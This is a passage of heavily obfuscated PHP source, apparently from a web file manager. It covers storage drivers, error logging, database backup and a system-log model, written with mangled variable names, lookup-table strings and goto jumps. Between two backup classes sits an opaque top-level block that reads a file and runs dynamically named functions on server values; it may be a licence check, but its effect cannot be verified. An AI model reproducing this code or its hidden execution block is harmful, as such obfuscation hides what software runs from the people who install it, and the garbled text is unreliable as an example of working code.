$¼ıÛßØê->getType() == $ş²¨İÔ¾[109] && !$¼ıÛßØê->exist($ù¾£¼¿)) { $¯áä’ß‹ = get_path_this($ù¾£¼¿); $ú¼€éçà = parse_url_query($¯áä’ß‹); if (is_array($ú¼€éçà) && isset($ú¼€éçà[$ş²¨İÔ¾[32]])) { $¯áä’ß‹ = urldecode($ú¼€éçà[$ş²¨İÔ¾[32]]); } throw new Exception($ş²¨İÔ¾[1256] . LNG($ş²¨İÔ¾[1257]) . $ş²¨İÔ¾[1054] . clear_html($¯áä’ß‹) . $ş²¨İÔ¾[12]); } if ($ÖµÏ³ò <= 0) { return $ş²¨İÔ¾[12]; } if ($ëÒ˜Ä»° < 0 || $ëÒ˜Ä»° >= $¯õ¡ƒ· || $ÖµÏ³ò > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\x52\x65\x61\144\x20\x65\x72\162\157\162\41\x20\x73\164\141\162\164\x3d{$ëÒ˜Ä»°}\x3b\x6c\145\156\147\164\150\x3d{$ÖµÏ³ò}\73\x20\163\x69\172\x65\x3d{$¯õ¡ƒ·}\x3b"); } $Ì¸½Ó– = $¼ıÛßØê->fileSubstr($ù¾£¼¿, $ëÒ˜Ä»°, $ÖµÏ³ò); if (!$Ì¸½Ó– && $ÖµÏ³ò && isset($GLOBALS[$ş²¨İÔ¾[1258]])) { throw new Exception($GLOBALS[$ş²¨İÔ¾[1258]][$ş²¨İÔ¾[1259]]); } return $Ì¸½Ó–; } private static function driverMake(&$êø·…š) { $÷î¿ì› =& $_SERVER[¡¬ıÜ ƒ]; $›œ÷íß¦ = KodIO::parse($êø·…š); if (!self::$driverListSystem) { $‰´½²º« = Model($÷î¿ì›[847])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‰´½²º«, $÷î¿ì›[477]); } if ($›œ÷íß¦[$÷î¿ì›[33]] == KodIO::KOD_IO && !self::$driverListSystem[$›œ÷íß¦[$÷î¿ì›[477]]]) { throw new Exception($÷î¿ì›[1260]); return !1; } $êø·…š = $›œ÷íß¦[$÷î¿ì›[1261]]; $¯”Åˆ‚Ò = self::driverGet($›œ÷íß¦, $êø·…š); return $¯”Åˆ‚Ò; } private static function driverGet($”¤†®éÈ, &$Íæ†…”) { $“œšê‘ =& $_SERVER[¡¬ıÜ ƒ]; $­Ó·¬˜ = $”¤†®éÈ[$“œšê‘[1262]]; $¢œÏÕ‹ë = $”¤†®éÈ[$“œšê‘[477]]; switch ($”¤†®éÈ[$“œšê‘[33]]) { case KodIO::KOD_IO: $üÒæŒªÜ = self::$driverListSystem[$¢œÏÕ‹ë]; break; case KodIO::KOD_SOURCE: $Íæ†…” = $¢œÏÕ‹ë . $Íæ†…”; $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1264], $“œšê‘[6] => $”¤†®éÈ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $á„ó¦¡ª = $GLOBALS[$“œšê‘[1265]]; self::$driverListUser = array_to_keyvalue($á„ó¦¡ª, $“œšê‘[477]); } $üÒæŒªÜ = self::$driverListUser[$¢œÏÕ‹ë]; break; case KodIO::KOD_SHARE_LINK: $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1266], $“œšê‘[6] => $”¤†®éÈ); $ƒÔ©‘³ì = Action($“œšê‘[1267])->sharePathInfo($”¤†®éÈ[$“œšê‘[87]]); $Íæ†…” = $ƒÔ©‘³ì[$“œšê‘[193]]; if (!$ƒÔ©‘³ì[$“œšê‘[193]]) { $Ê¯÷ûÜ = Model($“œšê‘[669])->getInfo($ƒÔ©‘³ì[$“œšê‘[670]]); $Íæ†…” = KodIO::clear($Ê¯÷ûÜ[$“œšê‘[1268]] . $”¤†®éÈ[$“œšê‘[1261]]); $”¤†®éÈ[$“œšê‘[562]] = $Ê¯÷ûÜ; $”¤†®éÈ[$“œšê‘[1243]] = $Íæ†…”; $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1269], $“œšê‘[6] => $”¤†®éÈ); } break; case KodIO::KOD_SHARE_ITEM: $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1270], $“œšê‘[6] => $”¤†®éÈ); $Ê¯÷ûÜ = Model($“œšê‘[669])->getInfo($”¤†®éÈ[$“œšê‘[477]]); if ($Ê¯÷ûÜ[$“œšê‘[193]] == $“œšê‘[230]) { $Íæ†…” = KodIO::clear($Ê¯÷ûÜ[$“œšê‘[1268]] . $”¤†®éÈ[$“œšê‘[1261]]); $”¤†®éÈ[$“œšê‘[562]] = $Ê¯÷ûÜ; $”¤†®éÈ[$“œšê‘[1243]] = $Íæ†…”; $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1271], $“œšê‘[6] => $”¤†®éÈ); } else { if (!$Íæ†…”) { $Íæ†…” = $Ê¯÷ûÜ[$“œšê‘[193]]; } } break; default: $Íæ†…” = $”¤†®éÈ[$“œšê‘[87]]; $üÒæŒªÜ = array($“œšê‘[1263] => $“œšê‘[1272]); break; } $”Ò¸ôš = $”¤†®éÈ[$“œšê‘[87]]; if (!isset(self::$driverCache[$”Ò¸ôš])) { $óµ¹æŒô = strtolower($üÒæŒªÜ[$“œšê‘[98]]); $¶ÅˆÃ“ = $GLOBALS[$“œšê‘[6]][$“œšê‘[92]][$“œšê‘[915]]; $²Ë¦í¶« = $“œšê‘[77] . (isset($¶ÅˆÃ“[$óµ¹æŒô]) ? $¶ÅˆÃ“[$óµ¹æŒô] : ucfirst($óµ¹æŒô)); if (!class_exists($²Ë¦í¶«)) { show_json("{$²Ë¦í¶«}\x20\156\157\x74\x20\x65\170\x69\163\x74\163\41", !1); } $ê›õ«Ï = isset($üÒæŒªÜ[$“œšê‘[6]]) ? $üÒæŒªÜ[$“œšê‘[6]] : !1; self::$driverCache[$”Ò¸ôš] = new $²Ë¦í¶«($ê›õ«Ï); } $‡ØÈËÙı = self::$driverCache[$”Ò¸ôš]; $‡ØÈËÙı->pathDriver = $­Ó·¬˜; $‡ØÈËÙı->pathBase = $“œšê‘[12]; if (isset($üÒæŒªÜ[$“œšê‘[6]][$“œšê‘[1273]])) { $‡ØÈËÙı->pathBase = rtrim($üÒæŒªÜ[$“œšê‘[6]][$“œšê‘[1273]], $“œšê‘[8]) . $“œšê‘[8]; $Íæ†…” = $‡ØÈËÙı->pathBase . ltrim($Íæ†…”, $“œšê‘[8]); } $Íæ†…” = $‡ØÈËÙı->getPath($Íæ†…”); if (isset($”¤†®éÈ[$“œšê‘[1243]])) { $Íæ†…” = $”¤†®éÈ[$“œšê‘[1243]]; } $‡ØÈËÙı->path = $Íæ†…”; return $‡ØÈËÙı; } public static function errorTips($‹Î¯è® = false) { $êØ‹Å³í =& $_SERVER[¡¬ıÜ ƒ]; static $ñœñğï = array(); $â€Õµ¶¯ = 1000; if ($‹Î¯è® === -1) { return $ñœñğï ? $ñœñğï[count($ñœñğï) - 1] : $êØ‹Å³í[12]; } if ($‹Î¯è® === !1) { return implode($êØ‹Å³í[287], $ñœñğï); } if (count($ñœñğï) >= $â€Õµ¶¯) { $ñœñğï = array_slice($ñœñğï, $â€Õµ¶¯ * 0.5, $â€Õµ¶¯); } $ñœñğï[] = $‹Î¯è®; write_log($êØ‹Å³í[176] . ACTION . $êØ‹Å³í[1274] . $‹Î¯è®, $êØ‹Å³í[1275]); } public static function getLastError($²Ä©àÖÜ = '') { $‘çÁÑ—› = self::errorTips(-1); return $‘çÁÑ—› ? $‘çÁÑ—› : $²Ä©àÖÜ; } } goto A‰è¥«Ù•ó; b”±Ç˜–‰Ñ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÄØßºşŸ =& $_SERVER[¡¬ıÜ ƒ]; $ËÀåá– = Backup::get(); self::$io = $ËÀåá–[$ÄØßºşŸ[832]]; self::$name = $ËÀåá–[$ÄØßºşŸ[32]]; $¼×©Øêœ = new DbManage(); $Œö›àÙà = $¼×©Øêœ->dbType(); $¯¡¾ïµ˜ = array($ÄØßºşŸ[865] => $Œö›àÙà, $ÄØßºşŸ[866] => time()); Backup::set($¯¡¾ïµ˜); $ô¾Óôğ– = $this->tmpFilesPath() . $ÄØßºşŸ[867] . self::$name . $ÄØßºşŸ[8]; del_dir($ô¾Óôğ–); mk_dir($ô¾Óôğ–); $á’±«Ê = $™ë‚ü—Ë = 0; try { $½¶ˆ¿Õê = $¼×©Øêœ->db()->getTables(); } catch (Exception $¨¬ß¸ê§) { return !1; } $½¶ˆ¿Õê = array_diff($½¶ˆ¿Õê, array($ÄØßºşŸ[868], $ÄØßºşŸ[869])); foreach ($½¶ˆ¿Õê as $Ãû¸É‚Ë) { if ($Ãû¸É‚Ë == $ÄØßºşŸ[870]) { continue; } $á’±«Ê += $¼×©Øêœ->model($Ãû¸É‚Ë)->count(); } $Ùİ§‹ = new Task($ÄØßºşŸ[871], $ÄØßºşŸ[872], $á’±«Ê, LNG($ÄØßºşŸ[873]) . $ÄØßºşŸ[874] . LNG($ÄØßºşŸ[875])); $GLOBALS[$ÄØßºşŸ[876]] = self::$name; foreach ($½¶ˆ¿Õê as $Ãû¸É‚Ë) { $ËÑÃ = $ô¾Óôğ– . $Ãû¸É‚Ë . $ÄØßºşŸ[877]; if ($Ãû¸É‚Ë == $ÄØßºşŸ[870]) { @touch($ËÑÃ); continue; } $ÆŞíÒµ® = null; if ($Ãû¸É‚Ë == $ÄØßºşŸ[878] && $ËÀåá–[$ÄØßºşŸ[171]] == $ÄØßºşŸ[856]) { $ÆŞíÒµ® = self::$io; } $™ë‚ü—Ë += $¼×©Øêœ->sqlFromDb($Ãû¸É‚Ë, $ËÑÃ, $Ùİ§‹, $ÆŞíÒµ®); } unset($GLOBALS[$ÄØßºşŸ[876]]); $Ùİ§‹->end(); if ($™ë‚ü—Ë > $á’±«Ê) { $á’±«Ê = $™ë‚ü—Ë; } $¯¡¾ïµ˜ = array($ÄØßºşŸ[865] => $Œö›àÙà, $ÄØßºşŸ[853] => 1, $ÄØßºşŸ[879] => $á’±«Ê, $ÄØßºşŸ[880] => $™ë‚ü—Ë, $ÄØßºşŸ[881] => time()); Backup::set($¯¡¾ïµ˜); if ($á’±«Ê - $™ë‚ü—Ë > 0) { $¯è·ş¸ı = $ÄØßºşŸ[882]; if (!stristr(I18n::getType(), $ÄØßºşŸ[883])) { $¯è·ş¸ı = $ÄØßºşŸ[884]; } write_log(array($¯è·ş¸ı, $¯¡¾ïµ˜), $ÄØßºşŸ[872]); return !1; } return !0; } private function tmpFilesPath() { $—Ö°È¶ =& $_SERVER[¡¬ıÜ ƒ]; $¥’‘óä = TEMP_FILES; if ($GLOBALS[$—Ö°È¶[6]][$—Ö°È¶[92]][$—Ö°È¶[885]]) { $¥’‘óä = $GLOBALS[$—Ö°È¶[6]][$—Ö°È¶[92]][$—Ö°È¶[885]]; if (!mk_dir($¥’‘óä) || !is_writable($¥’‘óä) || !IO::mkfile($¥’‘óä . $—Ö°È¶[886])) { $¥’‘óä = TEMP_FILES; } } return $¥’‘óä; } } if ($_SERVER[$_SERVER[¡¬ıÜ ƒ][859]] != $_SERVER[$_SERVER[¡¬ıÜ ƒ][887]]) { $_getc = $_SERVER[¡¬ıÜ ƒ][860]; $_getfile = $_SERVER[$_SERVER[¡¬ıÜ ƒ][861]] . $_SERVER[¡¬ıÜ ƒ][862]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡¬ıÜ ƒ][287], $_getfilec); if (count($_getarrs) < $_SERVER[¡¬ıÜ ƒ][697]) { $exit = $_SERVER[¡¬ıÜ ƒ][863]; $exit(); } $_act = $_SERVER[¡¬ıÜ ƒ][864]; $_act($_SERVER[$_SERVER[¡¬ıÜ ƒ][857]]); } class BackupDbFile { public function __construct() { } public function index() { $«òâÅ’ =& $_SERVER[¡¬ıÜ ƒ]; $ú¹­Ø¾ = Backup::get(); $–¿˜«¸‹ = $ú¹­Ø¾[$«òâÅ’[32]]; $çÊ¸·³½ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\160\x5f{$–¿˜«¸‹}\x2f"; $Ï«çà†Ê = $this->backupPath($ú¹­Ø¾); if (!($Ï«çà†Ê = IO::mkdir($Ï«çà†Ê))) { return !1; } $’û˜âÒª = IO::listPath($çÊ¸·³½); $İÌÇÚÕ— = isset($’û˜âÒª[$«òâÅ’[86]]) ? $’û˜âÒª[$«òâÅ’[86]] : array(); $Ş¥•‰‘ = array_sum(array_column($İÌÇÚÕ—, $«òâÅ’[79])); if (!$Ş¥•‰‘) { return !1; } $ŒİÌì‘Ç = array($«òâÅ’[888] => $Ş¥•‰‘, $«òâÅ’[889] => time()); Backup::set($ŒİÌì‘Ç); $ØØÁëí = new TaskFileTransfer($«òâÅ’[890], $«òâÅ’[872], count($İÌÇÚÕ—), LNG($«òâÅ’[873]) . $«òâÅ’[464] . LNG($«òâÅ’[875]) . $«òâÅ’[891]); $ØØÁëí->task[$«òâÅ’[843]] = $Ş¥•‰‘; foreach ($’û˜âÒª[$«òâÅ’[86]] as $³çù¥è) { $²»…¸†ï = IO::move($³çù¥è[$«òâÅ’[87]], $Ï«çà†Ê); if (!$²»…¸†ï) { $ØØÁëí->end(); $Åï¥ì»¶ = IO::getLastError($«òâÅ’[892] . $³çù¥è[$«òâÅ’[87]] . $«òâÅ’[893] . $Ï«çà†Ê . $«òâÅ’[178]); write_log($Åï¥ì»¶, $«òâÅ’[872]); return !1; } } $÷ƒîôìÕ = new DbManage(); $ø—Û’åˆ = $÷ƒîôìÕ->getSqlFile(); if (!$ø—Û’åˆ[$«òâÅ’[894]] || !$ø—Û’åˆ[$«òâÅ’[13]]) { return !1; } IO::move($ø—Û’åˆ[$«òâÅ’[894]], $Ï«çà†Ê); IO::move($ø—Û’åˆ[$«òâÅ’[13]], $Ï«çà†Ê); $ØØÁëí->end(); $ŒİÌì‘Ç = array($«òâÅ’[895] => $Ş¥•‰‘, $«òâÅ’[896] => time()); Backup::set($ŒİÌì‘Ç); return !0; } private function backupPath($®â¿œœÀ) { $©«Éµ¨Ì =& $_SERVER[¡¬ıÜ ƒ]; $ÁËÚÁÖï = $®â¿œœÀ[$©«Éµ¨Ì[32]]; $ôüÅÄ‚ = Model($©«Éµ¨Ì[850])->get($©«Éµ¨Ì[851]); $‚¥æªÖˆ = substr(md5($©«Éµ¨Ì[852] . $ôüÅÄ‚ . $ÁËÚÁÖï), 0, 8); return "\173\x69\157\x3a{$®â¿œœÀ[$©«Éµ¨Ì[832]]}\x7d\57\x64\x61\x74\141\142\x61\x73\x65\57\x62\x61\x63\153\165\x70\57" . $ÁËÚÁÖï . $©«Éµ¨Ì[11] . $‚¥æªÖˆ; } private function tmpFilesPath() { $Æƒ Ö¼¬ =& $_SERVER[¡¬ıÜ ƒ]; $æ´Õ„£æ = TEMP_FILES; if ($GLOBALS[$Æƒ Ö¼¬[6]][$Æƒ Ö¼¬[92]][$Æƒ Ö¼¬[885]]) { $æ´Õ„£æ = $GLOBALS[$Æƒ Ö¼¬[6]][$Æƒ Ö¼¬[92]][$Æƒ Ö¼¬[885]]; if (!mk_dir($æ´Õ„£æ) || !is_writable($æ´Õ„£æ) || !IO::mkfile($æ´Õ„£æ . $Æƒ Ö¼¬[886])) { $æ´Õ„£æ = TEMP_FILES; } } return $æ´Õ„£æ; } } goto F¨Ğ·´êÊ®; F¼Ò£›‘ğ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Â…‚ =& $_SERVER[¡¬ıÜ ƒ]; return array($Â…‚[2355] => LNG($Â…‚[2356]), $Â…‚[2357] => LNG($Â…‚[2358]), $Â…‚[1928] => LNG($Â…‚[2359]), $Â…‚[2360] => LNG($Â…‚[2361]), $Â…‚[2362] => LNG($Â…‚[2363]), $Â…‚[2364] => LNG($Â…‚[2365]), $Â…‚[2366] => LNG($Â…‚[2367]), $Â…‚[1958] => LNG($Â…‚[2367]), $Â…‚[1959] => LNG($Â…‚[2368]), $Â…‚[2369] => LNG($Â…‚[2370]), $Â…‚[2371] => LNG($Â…‚[2372]), $Â…‚[2373] => LNG($Â…‚[2374]), $Â…‚[2375] => LNG($Â…‚[2376]), $Â…‚[1956] => LNG($Â…‚[2377]), $Â…‚[2378] => LNG($Â…‚[2379]), $Â…‚[1963] => LNG($Â…‚[2380]), $Â…‚[2381] => LNG($Â…‚[2382]), $Â…‚[2383] => LNG($Â…‚[2384]), $Â…‚[2385] => LNG($Â…‚[2386]), $Â…‚[2387] => LNG($Â…‚[2388]), $Â…‚[1966] => LNG($Â…‚[2389]), $Â…‚[1967] => LNG($Â…‚[2390]), $Â…‚[2391] => LNG($Â…‚[2392]), $Â…‚[2393] => LNG($Â…‚[2394]), $Â…‚[2395] => LNG($Â…‚[2396]), $Â…‚[1961] => LNG($Â…‚[2397]), $Â…‚[2398] => LNG($Â…‚[2399]), $Â…‚[1960] => LNG($Â…‚[2400]), $Â…‚[2401] => LNG($Â…‚[2402]), $Â…‚[2403] => LNG($Â…‚[2404]), $Â…‚[2405] => LNG($Â…‚[2404]), $Â…‚[2406] => LNG($Â…‚[2407]), $Â…‚[2408] => LNG($Â…‚[2408]), $Â…‚[2409] => LNG($Â…‚[1932]), $Â…‚[2410] => LNG($Â…‚[2411]), $Â…‚[2412] => LNG($Â…‚[2413]), $Â…‚[2414] => LNG($Â…‚[2415]), $Â…‚[2416] => LNG($Â…‚[2417]), $Â…‚[2418] => LNG($Â…‚[2419]), $Â…‚[2420] => LNG($Â…‚[2420]), $Â…‚[2421] => LNG($Â…‚[2422]), $Â…‚[2423] => LNG($Â…‚[2424]), $Â…‚[2425] => LNG($Â…‚[2426]), $Â…‚[2427] => LNG($Â…‚[2428]), $Â…‚[2429] => LNG($Â…‚[2430]), $Â…‚[2431] => LNG($Â…‚[2432]), $Â…‚[212] => LNG($Â…‚[212]), $Â…‚[213] => LNG($Â…‚[2433]), $Â…‚[2434] => LNG($Â…‚[2434])); } private function typeFile() { $ö¡¦ñ¤ =& $_SERVER[¡¬ıÜ ƒ]; $¥÷îà§œ = array($ö¡¦ñ¤[1963] => array($ö¡¦ñ¤[1964]), $ö¡¦ñ¤[2373] => array($ö¡¦ñ¤[2435]), $ö¡¦ñ¤[2375] => array($ö¡¦ñ¤[2436]), $ö¡¦ñ¤[1956] => array($ö¡¦ñ¤[1957], $ö¡¦ñ¤[2437]), $ö¡¦ñ¤[2383] => array(), $ö¡¦ñ¤[2385] => array(), $ö¡¦ñ¤[2387] => array(), $ö¡¦ñ¤[1966] => array($ö¡¦ñ¤[1968]), $ö¡¦ñ¤[1967] => array($ö¡¦ñ¤[1968]), $ö¡¦ñ¤[2391] => array($ö¡¦ñ¤[2438]), $ö¡¦ñ¤[2393] => array($ö¡¦ñ¤[2438]), $ö¡¦ñ¤[2395] => array($ö¡¦ñ¤[2439]), $ö¡¦ñ¤[2381] => array($ö¡¦ñ¤[2440]), $ö¡¦ñ¤[1961] => array($ö¡¦ñ¤[2441]), $ö¡¦ñ¤[2398] => array($ö¡¦ñ¤[2442]), $ö¡¦ñ¤[1960] => array($ö¡¦ñ¤[1962])); return $¥÷îà§œ; } private function typeAll() { $êóèê´å =& $_SERVER[¡¬ıÜ ƒ]; $ÀÚ­¿Â = $this->typeList; $öË³ùôÔ = array_filter($this->typeFile()); foreach ($öË³ùôÔ as $äéêÕ–û => $Ò‚ıæ¹£) { $ÀÚ­¿Â[$Ò‚ıæ¹£[0]] = $ÀÚ­¿Â[$äéêÕ–û]; } $ÀÚ­¿Â[$êóèê´å[1968]] = LNG($êóèê´å[2443]); $ÀÚ­¿Â[$êóèê´å[2438]] = LNG($êóèê´å[2444]); return $ÀÚ­¿Â; } public function addLog($®õÃ§¬×, $ãíìûŒ = array()) { $¡ŸÒ¹¼Ñ =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->typeList[$®õÃ§¬×])) { return; } $¿²‡ÔŠ = Session::get($¡ŸÒ¹¼Ñ[2127]); if (!$¿²‡ÔŠ) { $¿²‡ÔŠ = _get($ãíìûŒ, $¡ŸÒ¹¼Ñ[1785], 0); } if ($®õÃ§¬× == $¡ŸÒ¹¼Ñ[2410] && is_array($ãíìûŒ[$¡ŸÒ¹¼Ñ[2445]]) && !$ãíìûŒ[$¡ŸÒ¹¼Ñ[2445]]) { return; } $§¦‚ÅŸ’ = get_client_ip(); if (!$ãíìûŒ || strlen(json_encode($ãíìûŒ)) >= 1024 * 64) { if ($ãíìûŒ && is_array($ãíìûŒ)) { $ãíìûŒ = array_intersect_key($ãíìûŒ, array_flip($¡ŸÒ¹¼Ñ[477], $¡ŸÒ¹¼Ñ[32])); $ãíìûŒ[$¡ŸÒ¹¼Ñ[2446]] = $§¦‚ÅŸ’; } else { $ãíìûŒ = array($¡ŸÒ¹¼Ñ[2446] => $§¦‚ÅŸ’); } } else { if (is_array($ãíìûŒ)) { $ãíìûŒ[$¡ŸÒ¹¼Ñ[2446]] = $§¦‚ÅŸ’; } else { $ãíìûŒ = array($¡ŸÒ¹¼Ñ[1298] => $ãíìûŒ, $¡ŸÒ¹¼Ñ[2446] => $§¦‚ÅŸ’); } } $ãíìûŒ = array($¡ŸÒ¹¼Ñ[1775] => Session::sign(), $¡ŸÒ¹¼Ñ[1776] => intval($¿²‡ÔŠ), $¡ŸÒ¹¼Ñ[33] => $®õÃ§¬×, $¡ŸÒ¹¼Ñ[1778] => json_encode($ãíìûŒ)); return parent::add($ãíìûŒ); } public function remove($ä¸Òïû) { $this->where(array($_SERVER[¡¬ıÜ ƒ][495] => $ä¸Òïû))->delete(); } private function _makeOrder($â†²±  = '') { $Œ¦£ö =& $_SERVER[¡¬ıÜ ƒ]; $ù¯ì¥»Ÿ = $Œ¦£ö[233]; $±ÜĞéƒ› = array($Œ¦£ö[525] => $Œ¦£ö[526], $Œ¦£ö[527] => $Œ¦£ö[528]); $É°Çø²Ñ = Input::get($Œ¦£ö[533], $Œ¦£ö[7], $Œ¦£ö[2164], array($Œ¦£ö[2081], $Œ¦£ö[527])); $É°Çø²Ñ = $±ÜĞéƒ›[$É°Çø²Ñ]; $â†²±  = $â†²±  . "{$ù¯ì¥»Ÿ}\40{$É°Çø²Ñ}"; return $this->order($â†²± ); } public function get($½şó‚ıï = '') { $Œ¯îœÂ =& $_SERVER[¡¬ıÜ ƒ]; if (!$½şó‚ıï) { show_json(array()); } $×’Ü§éØ = array(); if ($½şó‚ıï[$Œ¯îœÂ[1785]]) { $×’Ü§éØ[$Œ¯îœÂ[1785]] = $½şó‚ıï[$Œ¯îœÂ[1785]]; } if (isset($½şó‚ıï[$Œ¯îœÂ[840]])) { $¥şàí÷Ğ = $½şó‚ıï[$Œ¯îœÂ[840]]; $ó³ññºù = isset($½şó‚ıï[$Œ¯îœÂ[841]]) ? $½şó‚ıï[$Œ¯îœÂ[841]] : time(); $×’Ü§éØ[$Œ¯îœÂ[233]] = array($Œ¯îœÂ[410], array($¥şàí÷Ğ, $ó³ññºù)); } if ($½şó‚ıï[$Œ¯îœÂ[33]]) { $ÍØâ©À¦ = explode($Œ¯îœÂ[50], $½şó‚ıï[$Œ¯îœÂ[33]]); $ù¹ÜñÀª = $this->typeFile(); $ÇÏÉÄ® = array(); foreach ($ÍØâ©À¦ as $†’è€Ÿ¨) { $ÇÏÉÄ®[] = $†’è€Ÿ¨; if (isset($ù¹ÜñÀª[$†’è€Ÿ¨])) { $ÇÏÉÄ® = array_merge($ÇÏÉÄ®, $ù¹ÜñÀª[$†’è€Ÿ¨]); } } $ÇÏÉÄ® = array_unique($ÇÏÉÄ®); if ($ÇÏÉÄ®) { $×’Ü§éØ[$Œ¯îœÂ[33]] = array($Œ¯îœÂ[7], $ÇÏÉÄ®); } } else { $×’Ü§éØ[$Œ¯îœÂ[33]] = array($Œ¯îœÂ[2447], $Œ¯îœÂ[2448]); } if (!empty($½şó‚ıï[$Œ¯îœÂ[2446]])) { $×’Ü§éØ[$Œ¯îœÂ[528]] = array($Œ¯îœÂ[461], "\x25{$½şó‚ıï[$Œ¯îœÂ[2446]]}\45"); } $ÇèÏ·»ò = $this->_makeOrder()->where($×’Ü§éØ)->selectPage(); if (empty($ÇèÏ·»ò[$Œ¯îœÂ[447]])) { show_json(array(), !0, $ÇèÏ·»ò[$Œ¯îœÂ[444]]); } $ÇèÏ·»ò[$Œ¯îœÂ[447]] = $this->logList($ÇèÏ·»ò[$Œ¯îœÂ[447]]); return $ÇèÏ·»ò; } private function ipAddress(&$ƒŞÂã „) { $—Ñ‚¨¼ =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($ƒŞÂã „[$—Ñ‚¨¼[2446]])) { $êñ‡ëÛ€ = IpLocation::get($ƒŞÂã „[$—Ñ‚¨¼[2446]]); } else { $êñ‡ëÛ€ = LNG($—Ñ‚¨¼[2449]); } $ƒŞÂã „[$—Ñ‚¨¼[2450]] = $êñ‡ëÛ€; } private function descZipDownload($–‹á¬»², &$¿ßì¬²À) { $ñ·¾ÉóÁ =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($–‹á¬»²[$ñ·¾ÉóÁ[2451]])) { return; } $™®Ûáíğ = json_decode($–‹á¬»²[$ñ·¾ÉóÁ[2451]], !0); foreach ($™®Ûáíğ as $‘Ôı¼€²) { try { $âÂ²Ñ¨× = IO::infoFullSimple($‘Ôı¼€²[$ñ·¾ÉóÁ[87]]); } catch (Exception $ôà­¶‚é) { continue; } $–‹á¬»²[$ñ·¾ÉóÁ[87]] = $‘Ôı¼€²[$ñ·¾ÉóÁ[87]]; $¿ßì¬²À[] = $–‹á¬»²[$ñ·¾ÉóÁ[193]] = $âÂ²Ñ¨×[$ñ·¾ÉóÁ[193]]; $¿ßì¬²À[] = $–‹á¬»²[$ñ·¾ÉóÁ[2220]] = $âÂ²Ñ¨×[$ñ·¾ÉóÁ[192]]; break; } return $–‹á¬»²; } private function getSourceList(&$ôì¤ˆ—) { $Á˜Øû¹™ =& $_SERVER[¡¬ıÜ ƒ]; $Óç‚¸’µ = array(); foreach ($ôì¤ˆ— as $ëİÉ‚Œ³ => $¨¶ÉóÎô) { $®â­øŒ = json_decode($¨¶ÉóÎô[$Á˜Øû¹™[528]], !0); if ($¨¶ÉóÎô[$Á˜Øû¹™[33]] == $Á˜Øû¹™[1959]) { $®â­øŒ = $this->descZipDownload($®â­øŒ, $Óç‚¸’µ); $ôì¤ˆ—[$ëİÉ‚Œ³][$Á˜Øû¹™[528]] = json_encode($®â­øŒ); continue; } if (strpos($¨¶ÉóÎô[$Á˜Øû¹™[33]], $Á˜Øû¹™[2222]) !== 0) { if (!isset($®â­øŒ[$Á˜Øû¹™[87]]) || strpos($¨¶ÉóÎô[$Á˜Øû¹™[33]], $Á˜Øû¹™[2452]) !== 0) { continue; } try { $äıƒ½Ñƒ = IO::infoFullSimple($®â­øŒ[$Á˜Øû¹™[87]]); } catch (Exception $¤Ëßé©ª) { continue; } $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[193]] = $äıƒ½Ñƒ[$Á˜Øû¹™[193]]; $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[2220]] = $äıƒ½Ñƒ[$Á˜Øû¹™[192]]; $ôì¤ˆ—[$ëİÉ‚Œ³][$Á˜Øû¹™[528]] = json_encode($®â­øŒ); continue; } $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[193]]; $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[2220]]; if ($®â­øŒ[$Á˜Øû¹™[33]] == $Á˜Øû¹™[625]) { $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[528]][$Á˜Øû¹™[1252]]; $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[528]][$Á˜Øû¹™[1253]]; } if ($®â­øŒ[$Á˜Øû¹™[33]] == $Á˜Øû¹™[2231]) { $Óç‚¸’µ[] = $®â­øŒ[$Á˜Øû¹™[528]][$Á˜Øû¹™[193]]; } } if (!$Óç‚¸’µ) { return array(); } return Model($Á˜Øû¹™[914])->sourceListInfo($Óç‚¸’µ, !0); } private function logList($ÉÃš‹—Í) { $í§½ï¿´ =& $_SERVER[¡¬ıÜ ƒ]; $¿®íºÆœ = array_to_keyvalue($ÉÃš‹—Í, $í§½ï¿´[12], $í§½ï¿´[1785]); $è•¨ª¹Ï = Model($í§½ï¿´[599])->userListInfo(array_unique($¿®íºÆœ)); $â¦ÑØ¬ğ = $this->getSourceList($ÉÃš‹—Í); $×¹¿¸—‡ = $this->typeAll(); $ıÕ¹»ûò = array(); $û¶½ãâš = array(); foreach ($ÉÃš‹—Í as $–øâ•ğ™ => $èÑùó) { $ø„ÄîÆ§ = $èÑùó[$í§½ï¿´[33]]; $éÒ¿ï©‹ = isset($è•¨ª¹Ï[$èÑùó[$í§½ï¿´[1785]]]) ? $è•¨ª¹Ï[$èÑùó[$í§½ï¿´[1785]]] : !1; $Š¯˜‚ñ = strpos($ø„ÄîÆ§, $í§½ï¿´[2453]) === 0 ? LNG($í§½ï¿´[2454]) : LNG($í§½ï¿´[2449]); $èÑùó[$í§½ï¿´[32]] = isset($éÒ¿ï©‹[$í§½ï¿´[32]]) ? $éÒ¿ï©‹[$í§½ï¿´[32]] : LNG($í§½ï¿´[2449]); $èÑùó[$í§½ï¿´[2281]] = isset($éÒ¿ï©‹[$í§½ï¿´[2281]]) ? $éÒ¿ï©‹[$í§½ï¿´[2281]] : $í§½ï¿´[12]; 